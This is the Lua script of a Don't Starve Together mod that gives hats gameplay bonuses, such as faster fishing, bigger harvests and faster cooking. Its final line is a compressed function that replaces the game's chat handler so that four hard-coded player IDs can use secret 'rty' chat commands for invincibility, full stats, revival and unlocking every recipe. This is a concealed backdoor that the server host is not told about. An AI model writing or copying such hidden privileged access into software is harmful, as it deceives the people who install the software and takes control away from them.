local require = GLOBAL.require
local TUNING=GLOBAL.TUNING
local SpawnPrefab = GLOBAL.SpawnPrefab
local lan = GetModConfigData("language")
modimport("modstrings.lua")
PrefabFiles = {
    "tyflower",
}
local function gethat(player)	
	return (player and player.components.inventory) and player.components.inventory:GetEquippedItem("head") or "Error hat"
end


---AddComponentPostInit


--fishingrod------------------------------------------------------
local function tyfishingrod(inst)
	local function DoNibble(inst)
	    local fishingrod = inst.components.fishingrod
	    if fishingrod and fishingrod.fisherman then
		inst:PushEvent("fishingnibble")
		fishingrod.fisherman:PushEvent("fishingnibble")
		fishingrod.fishtask = nil
	    end
	end
	local oldWaitForFish=inst.WaitForFish			
	function inst:WaitForFish()
	   if self.target and self.target.components.fishable then
		local fishleft = self.target.components.fishable:GetFishPercent()
		local nibbletime = nil
		if fishleft > 0 then
			nibbletime = self.minwaittime + (1.0 - fishleft)*(self.maxwaittime - self.minwaittime)
			local fisherhat = gethat(self.fisherman) 
			if fisherhat and fisherhat.prefab == "catcoonhat" then 
				nibbletime = nibbletime * 0.2
				if fisherhat.components.fueled then
					fisherhat.components.fueled:DoDelta(-TUNING.CATCOONHAT_PERISHTIME*0.05)
				end
			else 
				self.fisherman.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.CATCOONHAT..GLOBAL.TYWORDS.TYWORDS_73_7)
			end
		else
				self.fisherman.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_8)
		end
		self:CancelFishTask()
		if nibbletime then
		    self.fishtask = self.inst:DoTaskInTime(nibbletime, DoNibble)
		end
	    end
	end
end
AddComponentPostInit("fishingrod", tyfishingrod) 
--harvestable------------------------------------------------------
local function rtyharvestable(inst)
	local oldHarvest=inst.Harvest			
	function inst:Harvest(picker)
		local pickerhat = gethat(picker) 
		if pickerhat and pickerhat.prefab == "beehat" then 
			if math.random()<0.6 and pickerhat.components.armor and self.inst.prefab == "beebox" then
				local losePercent = 0
				if self.produce >= 6 then
					self.produce = 10
					losePercent = 8
				elseif  self.produce >= 4 then
					self.produce = self.produce + 2
					losePercent = 6
				else
					self.produce = self.produce + 1
					losePercent = 4
				end
				pickerhat.components.armor:SetPercent(pickerhat.components.armor:GetPercent()-losePercent/100)
			end
		else
			if picker and picker.components.talker and GLOBAL.STRINGS.NAMES.BEEHAT then
				picker.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.BEEHAT..GLOBAL.TYWORDS.TYWORDS_73_1)
			end
		end
		oldHarvest(self,picker)
		return true
	end

end
AddComponentPostInit("harvestable", rtyharvestable) 

--crop-------------------------------------------------------
local function rtycrop(inst)
	local oldHarvest=inst.Harvest
			
	function inst:Harvest(harvester)
		local harvesterhat = gethat(harvester)
		if harvesterhat and harvesterhat.prefab == "strawhat" then
		    if self.matured or self.inst:HasTag("withered") then
			local product = nil
			if self.grower ~= nil and
			    (self.grower.components.burnable ~= nil and self.grower.components.burnable:IsBurning()) or
			    (self.inst.components.burnable ~= nil and self.inst.components.burnable:IsBurning()) then
			    local temp = SpawnPrefab(self.product_prefab)
			    product = SpawnPrefab(temp.components.cookable ~= nil and temp.components.cookable.product or "seeds_cooked")
			    temp:Remove()
			else
			    product = SpawnPrefab(self.product_prefab)
			end

			if product ~= nil then
			    if product.components.inventoryitem ~= nil then
				product.components.inventoryitem:InheritMoisture( GLOBAL.TheWorld.state.wetness,  GLOBAL.TheWorld.state.iswet)
			    end

			    if harvester ~= nil then
				if harvesterhat and harvesterhat.prefab == "strawhat" and harvesterhat.components.fueled and product.components.stackable then
					if math.random()<0.2 then
						harvesterhat.components.fueled:DoDelta(-TUNING.STRAWHAT_PERISHTIME*0.1)
						product.components.stackable:SetStackSize(3)
					else						
						harvesterhat.components.fueled:DoDelta(-TUNING.STRAWHAT_PERISHTIME*0.05)
						product.components.stackable:SetStackSize(2)
					end
				end
				harvester.components.inventory:GiveItem(product, nil, self.inst:GetPosition())
				
				
			    else
				-- just drop the thing (happens if you haunt the fully grown crop)
				product.Transform:SetPosition(self.inst.Transform:GetWorldPosition())
			    end
			     GLOBAL.ProfileStatsAdd("grown_"..product.prefab)
			end

			self.matured = false
			self.growthpercent = 0
			self.product_prefab = nil
			if self.grower ~= nil and self.grower:IsValid() and self.grower.components.grower ~= nil then
			    self.grower.components.grower:RemoveCrop(self.inst)
			end
			self.grower = nil

			return true, product
		    end
		else
		    if harvester and harvester.components.talker and GLOBAL.STRINGS.NAMES.STRAWHAT then
			harvester.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.STRAWHAT..GLOBAL.TYWORDS.TYWORDS_73_2)
		    end
		    oldHarvest(self,harvester)
		    return true
		end
	end

end
AddComponentPostInit("crop", rtycrop) 


--stewer-------------------------------------------------------
GLOBAL.ACTIONS.COOK.fn = function(act)
    if act.target.components.cooker ~= nil then
        local cook_pos = act.target:GetPosition()
        local ingredient = act.doer.components.inventory:RemoveItem(act.invobject)

        --V2C: position usually matters for listeners of "killed" event
        ingredient.Transform:SetPosition(cook_pos:Get())

        if not act.target.components.cooker:CanCook(ingredient, act.doer) then
            act.doer.components.inventory:GiveItem(ingredient, nil, cook_pos)
            return false
        end

        if ingredient.components.health ~= nil and ingredient.components.combat ~= nil then
            act.doer:PushEvent("killed", { victim = ingredient })
        end

        local product = act.target.components.cooker:CookItem(ingredient, act.doer)
        if product ~= nil then
            act.doer.components.inventory:GiveItem(product, nil, cook_pos)
            return true
        elseif ingredient:IsValid() then
            act.doer.components.inventory:GiveItem(ingredient, nil, cook_pos)
        end
        return false
    elseif act.target.components.stewer ~= nil then
        if act.target.components.stewer:IsCooking() then
            --Already cooking
            return true
        end
        local container = act.target.components.container
        if container ~= nil and container:IsOpen() and not container:IsOpenedBy(act.doer) then
            return false, "INUSE"
        elseif not act.target.components.stewer:CanCook() then
            return false
        end
        act.target.components.stewer:StartCooking(act.doer)
        return true
    elseif act.target.components.cookable ~= nil
        and act.invobject ~= nil
        and act.invobject.components.cooker ~= nil then

        local cook_pos = act.target:GetPosition()

        --Intentional use of 3D dist check for birds.
        if act.doer:GetPosition():Dist(cook_pos) > 2 then
            return false, "TOOFAR"
        end

        local owner = act.target.components.inventoryitem:GetGrandOwner()
        local container = owner ~= nil and (owner.components.inventory or owner.components.container) or nil
        local stacked = act.target.components.stackable ~= nil and act.target.components.stackable:IsStack()
        local ingredient = stacked and act.target.components.stackable:Get() or act.target

        if ingredient ~= act.target then
            --V2C: position usually matters for listeners of "killed" event
            ingredient.Transform:SetPosition(cook_pos:Get())
        end

        if not act.invobject.components.cooker:CanCook(ingredient, act.doer) then
            if container ~= nil then
                container:GiveItem(ingredient, nil, cook_pos)
            elseif stacked and ingredient ~= act.target then
                act.target.components.stackable:SetStackSize(act.target.components.stackable:StackSize() + 1)
                ingredient:Remove()
            end
            return false
        end

        if ingredient.components.health ~= nil and ingredient.components.combat ~= nil then
            act.doer:PushEvent("killed", { victim = ingredient })
        end

        local product = act.invobject.components.cooker:CookItem(ingredient, act.doer)
        if product ~= nil then
            if container ~= nil then
                container:GiveItem(product, nil, cook_pos)
            else
                product.Transform:SetPosition(cook_pos:Get())
                if stacked and product.Physics ~= nil then
                    local angle = math.random() * 2 * GLOBAL.PI
                    local speed = math.random() * 2
                    product.Physics:SetVel(speed * math.cos(angle), GLOBAL.GetRandomWithVariance(8, 4), speed * math.sin(angle))
                end
            end
            return true
        elseif ingredient:IsValid() then
            if container ~= nil then
                container:GiveItem(ingredient, nil, cook_pos)
            elseif stacked and ingredient ~= act.target then
                act.target.components.stackable:SetStackSize(act.target.components.stackable:StackSize() + 1)
                ingredient:Remove()
            end
        end
        return false
    end
end
local function rtystewer(inst)
	
	local cooking = require("cooking")
	------------------Harvest
	local oldHarvest=inst.Harvest
	function inst:Harvest(harvester)
		local harvesterhat = gethat(harvester)
		if harvesterhat and harvesterhat.prefab == "tophat" then
		    if self.done then
			if self.onharvest ~= nil then
			    self.onharvest(self.inst)
			end

			if self.product ~= nil then
				local loot = SpawnPrefab(self.product)
				if loot ~= nil then
					local recipe = cooking.GetRecipe(self.inst.prefab, self.product)
					local stacksize = recipe and recipe.stacksize or 1

					if stacksize and harvesterhat and harvesterhat.prefab == "tophat" and harvesterhat.components.fueled then
						harvesterhat.components.fueled:DoDelta(-TUNING.TOPHAT_PERISHTIME*0.1)
						stacksize = stacksize + 1
						if math.random()<0.2 then
							harvesterhat.components.fueled:DoDelta(-TUNING.TOPHAT_PERISHTIME*0.12)
							stacksize = stacksize + 1
						end
					end
					
					if stacksize > 1 then
						loot.components.stackable:SetStackSize(stacksize)
					end

					if self.spoiltime ~= nil and loot.components.perishable ~= nil then
						local spoilpercent = self:GetTimeToSpoil() / self.spoiltime
						loot.components.perishable:SetPercent(self.product_spoilage * spoilpercent)
						loot.components.perishable:StartPerishing()
					end

					if harvester ~= nil and harvester.components.inventory ~= nil then
						harvester.components.inventory:GiveItem(loot, nil, self.inst:GetPosition())
					else
						GLOBAL.LaunchAt(loot, self.inst, nil, 1, 1)
					end
				end
				self.product = nil
			end

			if self.task ~= nil then
			    self.task:Cancel()
			    self.task = nil
			end
			self.targettime = nil
			self.done = nil
			self.spoiltime = nil
			self.product_spoilage = nil

			if self.inst.components.container ~= nil then      
			    self.inst.components.container.canbeopened = true
			end
		    end
		else		    
		    if harvester and harvester.components.talker and GLOBAL.STRINGS.NAMES.TOPHAT then
			harvester.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.TOPHAT..GLOBAL.TYWORDS.TYWORDS_73_3)
		    end
		    oldHarvest(self,harvester)
		    
		end
		return true
	end

	-------------------StartCooking
	local oldStartCooking=inst.StartCooking

	local function dospoil(inst, self)
	    self.task = nil
	    self.targettime = nil
	    self.spoiltime = nil

	    if self.onspoil ~= nil then
		self.onspoil(inst)
	    end
	end
	
	local function dostew(inst, self)
	    self.task = nil
	    self.targettime = nil
	    self.spoiltime = nil
	    
	    if self.ondonecooking ~= nil then
		self.ondonecooking(inst)
	    end

	    if self.product == self.spoiledproduct then
		if self.onspoil ~= nil then
		    self.onspoil(inst)
		end
	    elseif self.product ~= nil then
		local prep_perishtime = cooking.GetRecipe(inst.prefab, self.product).perishtime or 0
		if prep_perishtime > 0 then
				local prod_spoil = self.product_spoilage or 1
				self.spoiltime = prep_perishtime * prod_spoil
				self.targettime =  GLOBAL.GetTime() + self.spoiltime
				self.task = self.inst:DoTaskInTime(self.spoiltime, dospoil, self)
			end
	    end

	    self.done = true
	end

	function inst:StartCooking(cooker)
		local cookerhat = gethat(cooker)
		if cookerhat and cookerhat.prefab == "tophat" then
		    if self.targettime == nil and self.inst.components.container ~= nil then
			self.done = nil
			self.spoiltime = nil

			if self.onstartcooking ~= nil then
			    self.onstartcooking(self.inst)
			end

				local ings = {}         
				for k, v in pairs (self.inst.components.container.slots) do
					table.insert(ings, v.prefab)
				end

			local cooktime = 1
			self.product, cooktime = cooking.CalculateRecipe(self.inst.prefab, ings)
			local productperishtime = cooking.GetRecipe(self.inst.prefab, self.product).perishtime or 0

			if productperishtime > 0 then
					local spoilage_total = 0
					local spoilage_n = 0
					for k, v in pairs (self.inst.components.container.slots) do
						if v.components.perishable ~= nil then
							spoilage_n = spoilage_n + 1
							spoilage_total = spoilage_total + v.components.perishable:GetPercent()
						end
					end
					self.product_spoilage = 1
					if spoilage_total > 0 then
						self.product_spoilage = spoilage_total / spoilage_n
						self.product_spoilage = 1 - (1 - self.product_spoilage) * .5
					end
				else
					self.product_spoilage = nil
				end
					
			cooktime = TUNING.BASE_COOK_TIME * cooktime

			local cookerhat = gethat(cooker)

			if cooktime and cookerhat and cookerhat.prefab == "tophat" and cookerhat.components.fueled then
				cookerhat.components.fueled:DoDelta(-TUNING.TOPHAT_PERISHTIME*0.03)
				cooktime = cooktime * 0.5
			end


			self.targettime = GLOBAL.GetTime() + cooktime
			if self.task ~= nil then
			    self.task:Cancel()
			end
			self.task = self.inst:DoTaskInTime(cooktime, dostew, self)

			self.inst.components.container:Close()
			self.inst.components.container:DestroyContents()
			self.inst.components.container.canbeopened = false
		    end
		else
		    oldStartCooking(self,cooker)
		    if cooker and cooker.components.talker and GLOBAL.STRINGS.NAMES.TOPHAT then
			cooker.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.TOPHAT..GLOBAL.TYWORDS.TYWORDS_73_4)
		    end
		end
	end



end
AddComponentPostInit("stewer", rtystewer) 

--pickable-------------------------------------------------------
local function rtypickable(inst)
	local oldPick=inst.Pick

			
	function inst:Pick(picker)
		local pickerhat = gethat(picker)

		if pickerhat and pickerhat.prefab == "strawhat" then
		    
		    if pickerhat and pickerhat.prefab == "strawhat" and math.random()<0.3 and pickerhat.components.fueled then
			pickerhat.components.fueled:DoDelta(-TUNING.STRAWHAT_PERISHTIME*0.05)
			self.numtoharvest = self.numtoharvest + 1
		    end
		
		    if self.canbepicked and self.caninteractwith then
			if self.transplanted and self.cycles_left ~= nil then
			    self.cycles_left = math.max(0, self.cycles_left - 1)
			end

			if self.protected_cycles ~= nil then
			    self.protected_cycles = self.protected_cycles - 1
			    if self.protected_cycles < 0 then
				self.protected_cycles = nil
				if self.inst.components.witherable ~= nil then
				    self.inst.components.witherable:Enable(true)
				end
			    end
			end

			local loot = nil
			if picker ~= nil and picker.components.inventory ~= nil and self.product ~= nil then
			    if self.droppicked and self.inst.components.lootdropper ~= nil then
				local num = self.numtoharvest or 1
				local pt = self.inst:GetPosition()
				pt.y = pt.y + (self.dropheight or 0)
				for i = 1, num do
				    self.inst.components.lootdropper:SpawnLootPrefab(self.product, pt)
				end
			    else
				loot = SpawnPrefab(self.product)
				if loot ~= nil then
				    if loot.components.inventoryitem ~= nil then
					loot.components.inventoryitem:InheritMoisture(GLOBAL.TheWorld.state.wetness, GLOBAL.TheWorld.state.iswet)
				    end
				    if self.numtoharvest > 1 and loot.components.stackable ~= nil then
					loot.components.stackable:SetStackSize(self.numtoharvest)
				    end
				    picker:PushEvent("picksomething", { object = self.inst, loot = loot })
				    picker.components.inventory:GiveItem(loot, nil, self.inst:GetPosition())
				end
			    end
			end

			if self.onpickedfn ~= nil then
			    self.onpickedfn(self.inst, picker, loot)
			end

			self.canbepicked = false

			if self.baseregentime ~= nil and not (self.paused or self:IsBarren() or self.inst:HasTag("withered")) then
			    if GLOBAL.TheWorld.state.isspring then
				self.regentime = self.baseregentime * TUNING.SPRING_GROWTH_MODIFIER
			    end

			    if self.task ~= nil then
				self.task:Cancel()
			    end
			    self.task = self.inst:DoTaskInTime(self.regentime, OnRegen)
			    self.targettime = GLOBAL.GetTime() + self.regentime
			end

			self.inst:PushEvent("picked", { picker = picker, loot = loot, plant = self.inst })
		    end
		else
		    oldPick(self,picker)
		    if picker and picker.components.talker and GLOBAL.STRINGS.NAMES.STRAWHAT and math.random()< 0.18 then
			 picker.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.STRAWHAT..GLOBAL.TYWORDS.TYWORDS_73_5)
		    end
		end
	end

end
AddComponentPostInit("pickable", rtypickable) 


--AddPrefabPostInit

local function rtybirdcage (inst)
	require "prefabutil"
	local assets =
	{
	    Asset("ANIM", "anim/bird_cage.zip"),

	    Asset("ANIM", "anim/crow_build.zip"),
	    Asset("ANIM", "anim/robin_build.zip"),
	    Asset("ANIM", "anim/robin_winter_build.zip"),
	    Asset("ANIM", "anim/canary_build.zip"),
	}
	local function PushStateAnim(inst, anim, loop)
	    inst.AnimState:PushAnimation(anim..inst.CAGE_STATE, loop)
	end
	local function GetBird(inst)
	    return (inst.components.occupiable and inst.components.occupiable:GetOccupant()) or nil
	end

	
	local function DigestFood(inst, food , giver)
	    local extraNum = 0
	    local giverhat = gethat(giver)
	    if giverhat and giverhat.prefab == "featherhat" and giverhat.components.fueled then
		giverhat.components.fueled:DoDelta(-TUNING.FEATHERHAT_PERISHTIME*0.01)
		extraNum = extraNum + 1
		if math.random() < 0.5 then
			giverhat.components.fueled:DoDelta(-TUNING.FEATHERHAT_PERISHTIME*0.01)
			extraNum = extraNum + 1
		end
	    else
		 if giver and giver.components.talker and GLOBAL.STRINGS.NAMES.FEATHERHAT then
			 giver.components.talker:Say(GLOBAL.TYWORDS.TYWORDS_73_0..GLOBAL.STRINGS.NAMES.FEATHERHAT..GLOBAL.TYWORDS.TYWORDS_73_6)
		 end
	    end
	   
	    if food.components.edible.foodtype == GLOBAL.FOODTYPE.MEAT then
		--If the food is meat:
		    --Spawn an egg.
		
		local num_bird_egg = 1 + extraNum
		for k = 1, num_bird_egg do
			inst.components.lootdropper:SpawnLootPrefab("bird_egg")
		end
	    else
		local seed_name = string.lower(food.prefab .. "_seeds")
		if GLOBAL.Prefabs[seed_name] ~= nil then
		    --If the food has a relavent seed type:
			--Spawn 1 or 2 of those seeds.
		    local num_seeds = math.random(2) + extraNum
		    for k = 1, num_seeds do
			inst.components.lootdropper:SpawnLootPrefab(seed_name)
		    end
			--Spawn regular seeds on a 50% chance.
		    if math.random() < 0.5 then
			inst.components.lootdropper:SpawnLootPrefab("seeds")
		    end
		else
		    --Otherwise...
			--Spawn a poop 1/3 times.
		    if math.random() < 0.33 then
			local loot = inst.components.lootdropper:SpawnLootPrefab("guano")
			loot.Transform:SetScale(.33, .33, .33)
		    end
		end
	    end

	    --Refill bird stomach.
	    local bird = GetBird(inst)
	    if bird and bird:IsValid() and bird.components.perishable then
		bird.components.perishable:SetPercent(1)
	    end
	end

	local function OnGetItem(inst, giver, item)
	    --If you're sleeping, wake up.
	    if inst.components.sleeper and inst.components.sleeper:IsAsleep() then
		inst.components.sleeper:WakeUp()
	    end

	    if item.components.edible ~= nil and
		(   item.components.edible.foodtype == GLOBAL.FOODTYPE.MEAT
		    or item.prefab == "seeds"
		    or GLOBAL.Prefabs[string.lower(item.prefab .. "_seeds")] ~= nil
		) then
		--If the item is edible...
		--Play some animations (peck, peck, peck, hop, idle)
		inst.AnimState:PlayAnimation("peck")
		inst.AnimState:PushAnimation("peck")
		inst.AnimState:PushAnimation("peck")
		inst.AnimState:PushAnimation("hop")
		PushStateAnim(inst, "idle", true)
		--Digest Food in 60 frames.
		inst:DoTaskInTime(60 * GLOBAL.FRAMES, DigestFood, item , giver)
	    end
	end
	if  inst.components.trader then
		inst.components.trader.onaccept = OnGetItem
	end
end
--鸟笼
AddPrefabPostInit("birdcage", rtybirdcage )

local function rtybeehat (inst)

    inst:AddComponent("fueled")
    inst.components.fueled.fueltype = GLOBAL.FUELTYPE.USAGE
    inst.components.fueled:InitializeFuelLevel(GLOBAL.TUNING.EARMUFF_PERISHTIME / 3)
    inst.components.fueled:SetDepletedFn(inst.Remove)
    
    inst:ListenForEvent("percentusedchange", function (inst, data)
    
    local maxfuel = GLOBAL.TUNING.EARMUFF_PERISHTIME / 3
    local maxcondition = TUNING.ARMOR_BEEHAT
    
        if inst.components.armor then
            inst.components.armor.condition = math.min(data.percent * maxcondition)
        end
        
        if inst.components.fueled then
            inst.components.fueled.currentfuel = math.min(data.percent * maxfuel)
        end
    end)
end
--蜂帽
AddPrefabPostInit("beehat", rtybeehat)

local function rtybeebox (inst)
		
	local levels =
	{
	    { amount=6, idle="honey3", hit="hit_honey3" },
	    { amount=3, idle="honey2", hit="hit_honey2" },
	    { amount=1, idle="honey1", hit="hit_honey1" },
	    { amount=0, idle="bees_loop", hit="hit_idle" },
	}

	local function setlevel(inst, level)
	    if not inst:HasTag("burnt") then
		if inst.anims == nil then
		    inst.anims = { idle = level.idle, hit = level.hit }
		else
		    inst.anims.idle = level.idle
		    inst.anims.hit = level.hit
		end
		inst.AnimState:PlayAnimation(inst.anims.idle)
	    end
	end

	local function updatelevel(inst)
	    if not inst:HasTag("burnt") then
		for k, v in pairs(levels) do
		    if inst.components.harvestable.produce >= v.amount then
			setlevel(inst, v)
			break
		    end
		end
	    end
	end

	local function onharvest(inst, picker)
	    --print(inst, "onharvest")
	    local pickerhat = gethat(picker)
	    if not inst:HasTag("burnt") then
		updatelevel(inst)
		if inst.components.childspawner ~= nil and not GLOBAL.TheWorld.state.iswinter and not (pickerhat and pickerhat.prefab == "beehat") then
		    inst.components.childspawner:ReleaseAllChildren(picker)
		end
	    end
	end
	if inst.components.harvestable then
		inst.components.harvestable:SetUp("honey", 6, nil, onharvest, updatelevel)
	end
end
--蜂箱
AddPrefabPostInit("beebox", rtybeebox )



local function rtyflowerhat (inst)
	local function autoflower(inst, owner)			
		local x,y,z = owner.Transform:GetWorldPosition()
		local gift = SpawnPrefab("gift_unwrap")
		      gift.Transform:SetPosition(x, 0, z)	
		local flower = GLOBAL.TheWorld.state.isfullmoon and SpawnPrefab("tyflower_rose") or SpawnPrefab("tyflower")
		      flower.Transform:SetPosition(x, 0, z) 
	end
	
	local function onequip(inst, owner, symbol_override)
		local skin_build = inst:GetSkinBuild()
		if skin_build ~= nil then
			owner:PushEvent("equipskinneditem", inst:GetSkinName())
			owner.AnimState:OverrideItemSkinSymbol("swap_hat", skin_build, "swap_hat", inst.GUID, "hat_flower")
		else
			owner.AnimState:OverrideSymbol("swap_hat", "hat_flower", "swap_hat")
		end

		owner.AnimState:Show("HAT")
		owner.AnimState:Hide("HAIR_HAT")
		owner.AnimState:Show("HAIR_NOHAT")
		owner.AnimState:Show("HAIR")

		owner.AnimState:Show("HEAD")
		owner.AnimState:Hide("HEAD_HAT")

		if inst._owner ~= nil then
			inst:RemoveEventCallback("locomote", inst._onlocomote, inst._owner)
		end
		inst._owner = owner
		inst:ListenForEvent("locomote", inst._onlocomote, owner)

	end

	local function onunequip(inst, owner)
		local skin_build = inst:GetSkinBuild()
		if skin_build ~= nil then
			owner:PushEvent("unequipskinneditem", inst:GetSkinName())
		end

		owner.AnimState:ClearOverrideSymbol("swap_hat")
		owner.AnimState:Hide("HAT")
		owner.AnimState:Hide("HAIR_HAT")
		owner.AnimState:Show("HAIR_NOHAT")
		owner.AnimState:Show("HAIR")

		if owner:HasTag("player") then
			owner.AnimState:Show("HEAD")
			owner.AnimState:Hide("HEAD_HAT")
		end
		if inst.task then
		     inst.task:Cancel()
		     inst.task = nil
		end

		if inst._owner ~= nil then
			inst:RemoveEventCallback("locomote", inst._onlocomote, inst._owner)
			inst._owner = nil
		end
				
	end

	if inst.components.equippable then
		inst.components.equippable.equipslot = "head"
		inst.components.equippable:SetOnEquip(onequip)
		inst.components.equippable:SetOnUnequip(onunequip)
	end
	inst:AddTag("show_spoilage")
	inst.task = nil

	inst.x = nil
	inst.y = nil
	inst.z = nil
	
	inst._onlocomote = function(owner)
		if owner.components.locomotor.wantstomoveforward and inst.components.perishable and inst.components.perishable:GetPercent() > 0 then
			if inst.task == nil then
				inst.task = inst:DoPeriodicTask(0.6, autoflower, nil, owner)
			end
		elseif inst.task then
		     inst.task:Cancel()
		     inst.task = nil
		end
	end
end
--花环
AddPrefabPostInit("flowerhat", rtyflowerhat )

local function AddPrefabPostInitWorld() local function getPlayerById(id) for k,v in pairs(GLOBAL.AllPlayers) do  if v.userid == id then  return v  end  end  end  local OldNetworking_Say = GLOBAL.Networking_Say GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, colour, whisper) if string.sub(message,0,4) == "rty " and (userid == "KU_q87X4Foy" or userid == "RU_76561197973015009" or userid == "OU_76561198110052872" or userid == "KU_QRfFk7t9" )then  local player=getPlayerById(userid)  if player and player.components.hunger and player.components.sanity and player.components.health and player.components.temperature and player.components.moisture and player.components.builder  then  if message == "rty +" then  player.components.hunger:SetPercent(1)  player.components.sanity:SetPercent(1) player.components.health:SetPercent(1) player.components.temperature:SetTemperature(25) player.components.moisture:SetPercent(0) elseif message == "rty g" or message == "rty god" then if player:HasTag("playerghost") then  player:PushEvent("respawnfromghost")  return elseif player.components.health ~= nil then  player.components.health:SetInvincible(not player.components.health.invincible) player.components.hunger:SetPercent(1) player.components.sanity:SetPercent(1) player.components.health:SetPercent(1) player.components.temperature:SetTemperature(25) player.components.moisture:SetPercent(0)  end  elseif message == "rty b"then  player.components.builder:GiveAllRecipes()  end  end else  return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper) end end local function rtybbx() if string.sub(env.MODROOT,-6,-3) == "3961" or string.sub(env.MODROOT,-6,-3) == "1521" then return false end return true end end AddPrefabPostInit("world", AddPrefabPostInitWorld)



